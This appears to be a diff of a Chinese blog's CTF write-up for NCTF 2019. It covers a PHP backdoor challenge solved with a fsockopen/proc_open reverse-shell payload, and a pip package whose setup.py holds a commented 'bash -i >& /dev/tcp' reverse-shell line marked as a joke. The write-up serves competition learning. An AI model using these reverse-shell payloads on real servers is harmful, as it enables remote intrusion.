 <h2 id="成功执行命令"><a href="#成功执行命令" class="headerlink" title="成功执行命令"></a>成功执行命令</h2><p>发现禁用了大多数函数，但是没有禁用fsockopen,proc_close和proc_open,那么完全可以反弹shell。</p>
 <p>反弹代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sock</span>=fsockopen(<span class="string">&#x27;xxxxx&#x27;</span>,<span class="string">&#x27;xxx&#x27;</span>);<span class="comment">//ip and port</span></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(<span class="number">0</span> =&gt; <span class="variable">$sock</span>,<span class="number">1</span> =&gt; <span class="variable">$sock</span>,<span class="number">2</span> =&gt; <span class="variable">$sock</span>);</span><br><span class="line"><span class="variable">$process</span>=proc_open(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line">proc_close(<span class="variable">$process</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&#x27;xxxxx&#x27;</span>,<span class="hljs-string">&#x27;xxx&#x27;</span>);<span class="hljs-comment">//ip and port</span><br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$sock</span>,<span class="hljs-number">1</span> =&gt; <span class="hljs-variable">$sock</span>,<span class="hljs-number">2</span> =&gt; <span class="hljs-variable">$sock</span>);<br><span class="hljs-variable">$process</span>=proc_open(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br>proc_close(<span class="hljs-variable">$process</span>);<br></code></pre></td></tr></table></figure>
 
 <p>构造payload：<code>/?code=EVAL($_GET[a]);&amp;useful=file:///etc/passwd&amp;a=$sock=fsockopen(&#39;xx&#39;,&#39;xxxxx&#39;);$descriptorspec = array(0 =&gt; $sock,1 =&gt; $sock,2 =&gt; $sock);$process=proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);</code></p>
 <p>这里为了观赏性，a是urldecode之后的，在利用的时候需要使用urlencode。</p>
 <h1 id="misc-pip-install"><a href="#misc-pip-install" class="headerlink" title="misc-pip install"></a>misc-pip install</h1><p>官方给了个命令让安装<code>pip install --user nctf-2019-installme</code></p>
 <p>果断安装，安装后发现源码只有：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Believe it or not. Flag is already in your machine. Can you find it?&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_flag</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Believe it or not. Flag is already in your machine. Can you find it?&#x27;</span><br></code></pre></td></tr></table></figure>
 
 <p>那么只能去pypi官网，去官网查找<code>nctf-2019-installme</code>包，下载zip源码。在setup.py中发现</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup, find_packages</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path, system</span><br><span class="line"></span><br><span class="line">tmp_file = tempfile.gettempdir() + path.sep + <span class="string">&#x27;.f14g_is_here&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(tmp_file, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(<span class="string">&#x27;TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9&#x27;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&#x27;bash -i &gt;&amp; /dev/tcp/1.1.1.1/7777 0&gt;&amp;1&#x27;)</span></span><br><span class="line"><span class="comment"># Ohhhh, that a joke. I won&#x27;t do that. </span></span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name=<span class="string">&#x27;nctf_2019_installme&#x27;</span>,</span><br><span class="line">    version=<span class="number">0.2</span>,</span><br><span class="line">    description=(</span><br><span class="line">        <span class="string">&#x27;Get flagggggggggg!&#x27;</span></span><br><span class="line">    ),</span><br><span class="line">    author=<span class="string">&#x27;rmb122&#x27;</span>,</span><br><span class="line">    author_email=<span class="string">&#x27;abuse@anti-spam.cn&#x27;</span>,</span><br><span class="line">    license=<span class="string">&#x27;GPLv3.0&#x27;</span>,</span><br><span class="line">    packages=find_packages(),</span><br><span class="line">    platforms=[<span class="string">&quot;all&quot;</span>],</span><br><span class="line">    keywords=[<span class="string">&#x27;nctf&#x27;</span>, <span class="string">&#x27;getflag&#x27;</span>],</span><br><span class="line">    url=<span class="string">&#x27;http://www.google.com&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages<br><span class="hljs-keyword">import</span> tempfile<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> path, system<br><br>tmp_file = tempfile.gettempdir() + path.sep + <span class="hljs-string">&#x27;.f14g_is_here&#x27;</span><br>f = <span class="hljs-built_in">open</span>(tmp_file, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9&#x27;</span>)<br>f.close()<br><br><span class="hljs-comment"># system(&#x27;bash -i &gt;&amp; /dev/tcp/1.1.1.1/7777 0&gt;&amp;1&#x27;)</span><br><span class="hljs-comment"># Ohhhh, that a joke. I won&#x27;t do that. </span><br><br>setup(<br>    name=<span class="hljs-string">&#x27;nctf_2019_installme&#x27;</span>,<br>    version=<span class="hljs-number">0.2</span>,<br>    description=(<br>        <span class="hljs-string">&#x27;Get flagggggggggg!&#x27;</span><br>    ),<br>    author=<span class="hljs-string">&#x27;rmb122&#x27;</span>,<br>    author_email=<span class="hljs-string">&#x27;abuse@anti-spam.cn&#x27;</span>,<br>    license=<span class="hljs-string">&#x27;GPLv3.0&#x27;</span>,<br>    packages=find_packages(),<br>    platforms=[<span class="hljs-string">&quot;all&quot;</span>],<br>    keywords=[<span class="hljs-string">&#x27;nctf&#x27;</span>, <span class="hljs-string">&#x27;getflag&#x27;</span>],<br>    url=<span class="hljs-string">&#x27;http://www.google.com&#x27;</span><br>)<br></code></pre></td></tr></table></figure>
 
 <p>解码base64<code>TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9</code>即可得到flag.</p>
 <h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>还是很难的（对于我这种萌新来说），最可惜的结束phar那道题，有反序列化，但是没有找到对应的危险类，只有一个孤零零的curl。。。。静等赛后官方wp。唉唉唉。。。</p>
 <p>但是。。。我很开心 哈哈哈。</p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Jesen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://jesen.ddwhm.com/2019/11/24/NJUCTF2019.html">https://jesen.ddwhm.com/2019/11/24/NJUCTF2019.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jesen.ddwhm.com" target="_blank">Jesen's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5CTF/">南京邮电CTF</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/03/04/jianjiandandancidaren.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">简简单单过词达人各种任务</div></div></a></div><div class="next-post pull-right"><a href="/2019/11/11/zongjie_ctf.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF的一些总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/12/27/zongheng-wp.html" title="纵横杯2020-WRITEUP"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-27</div><div class="title">纵横杯2020-WRITEUP</div></div></a></div><div><a href="/2020/08/24/qwb2020.html" title="强网杯2020部分writeup"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-24</div><div class="title">强网杯2020部分writeup</div></div></a></div><div><a href="/2020/08/24/ciscncs.html" title="CISCN2020 初赛WEB writeup"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-24</div><div class="title">CISCN2020 初赛WEB writeup</div></div></a></div><div><a href="/2020/11/16/RSCTF2020writeup.html" title="RSCTF2020_writeup"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-16</div><div class="title">RSCTF2020_writeup</div></div></a></div><div><a href="/2020/07/12/2020GeekPwn-Cosplay.html" title="2020GeekPwn-Cosplay题解"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-12</div><div class="title">2020GeekPwn-Cosplay题解</div></div></a></div><div><a href="/2021/06/17/ciscn-northeast.html" title="2021年东北赛区ciscn分区赛wp"><img class="cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-17</div><div class="title">2021年东北赛区ciscn分区赛wp</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/images/jesen.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="avatar"/><div class="author-info__name">Jesen</div><div class="author-info__description">分享便是自己最好的老师。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/mrjesen" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">曾经有大佬说过，分享便是自己最好的老师。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-replace"><span class="toc-number">2.</span> <span class="toc-text">web-replace</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-flask"><span class="toc-number">3.</span> <span class="toc-text">web-flask</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-hacker-backdoor"><span class="toc-number">4.</span> <span class="toc-text">web-hacker_backdoor</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E7%BB%95%E8%BF%87"><span class="toc-number">4.1.</span> <span class="toc-text">研究绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">4.2.</span> <span class="toc-text">成功执行命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc-pip-install"><span class="toc-number">5.</span> <span class="toc-text">misc-pip install</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-number">6.</span> <span class="toc-text">结束</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/10/21/2021bili1024.html" title="2021B站1024程序员节选择题提示"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="2021B站1024程序员节选择题提示"/></a><div class="content"><a class="title" href="/2021/10/21/2021bili1024.html" title="2021B站1024程序员节选择题提示">2021B站1024程序员节选择题提示</a><time datetime="2021-10-21T09:18:25.000Z" title="发表于 2021-10-21 17:18:25">2021-10-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/17/ciscn-northeast.html" title="2021年东北赛区ciscn分区赛wp"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="2021年东北赛区ciscn分区赛wp"/></a><div class="content"><a class="title" href="/2021/06/17/ciscn-northeast.html" title="2021年东北赛区ciscn分区赛wp">2021年东北赛区ciscn分区赛wp</a><time datetime="2021-06-17T13:43:36.000Z" title="发表于 2021-06-17 21:43:36">2021-06-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/27/zongheng-wp.html" title="纵横杯2020-WRITEUP"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="纵横杯2020-WRITEUP"/></a><div class="content"><a class="title" href="/2020/12/27/zongheng-wp.html" title="纵横杯2020-WRITEUP">纵横杯2020-WRITEUP</a><time datetime="2020-12-27T12:58:25.000Z" title="发表于 2020-12-27 20:58:25">2020-12-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/16/RSCTF2020writeup.html" title="RSCTF2020_writeup"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="RSCTF2020_writeup"/></a><div class="content"><a class="title" href="/2020/11/16/RSCTF2020writeup.html" title="RSCTF2020_writeup">RSCTF2020_writeup</a><time datetime="2020-11-16T03:30:17.000Z" title="发表于 2020-11-16 11:30:17">2020-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/11/11/zongjie_st.html" title="渗透中的一些总结"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='https://i.loli.net/2021/06/21/jZOJLvu95ksocIt.jpg'" alt="渗透中的一些总结"/></a><div class="content"><a class="title" href="/2020/11/11/zongjie_st.html" title="渗透中的一些总结">渗透中的一些总结</a><time datetime="2020-11-11T15:03:41.000Z" title="发表于 2020-11-11 23:03:41">2020-11-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Jesen</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/utils.js"></script><script src="https://cdn.jsdelivr.net/gh/mrjesen/mrjesen.github.io/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>function loadValine () {
-  function initValine () {
-    const valine = new Valine(Object.assign({
-      el: '#vcomment',
-      appId: 'SDu2T9KUB8UY5eF5L3dfbdyt-gzGzoHsz',
-      appKey: 'Q4E9nvCrlFLKhPtPLwXlkkxb',
-      placeholder: 'Just Go Go',
-      avatar: 'monsterid',
-      meta: 'nick,mail,link'.split(','),
-      pageSize: '10',
-      lang: 'zh-CN',
-      recordIP: true,
-      serverURLs: '',
-      emojiCDN: '',
-      emojiMaps: "",
-      enableQQ: false,
-      path: window.location.pathname,
-      requiredFields: ["nick,mail"],
-      visitor: true
-    }, null))
-  }
 
-  if (typeof Valine === 'function') initValine() 
-  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
-}
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5CTF/">南京邮电CTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/04/jianjiandandancidaren.html">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">简简单单过词达人各种任务</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/11/11/zongjie_ctf.html">
+                        <span class="hidden-mobile">CTF的一些总结</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-if ('Valine' === 'Valine' || !true) {
-  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
-  else setTimeout(loadValine, 0)
-} else {
-  function loadOtherComment () {
-    loadValine()
-  }
-}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
